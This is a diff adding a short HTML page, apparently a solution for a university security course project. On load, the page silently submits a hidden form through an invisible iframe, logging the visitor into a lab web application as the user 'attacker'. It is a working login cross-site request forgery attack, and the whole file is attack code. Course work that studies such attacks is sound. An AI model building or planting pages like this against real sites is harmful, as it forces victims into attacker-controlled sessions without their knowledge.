@@ -1,0 +1,15 @@
+<!DOCTYPE html> 
+<html> 
+<body onload="document.forms[0].submit()"> 
+  
+<iframe name= "output_frame", style="display:none"> </iframe> 
+  
+<form action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4" method="POST" target="output_frame"> 
+<input type="hidden" name="username" value="attacker" /> 
+<input type="hidden" name="password" value="123456"/> 
+</form> 
+
+</body> 
+</html> 
+
+
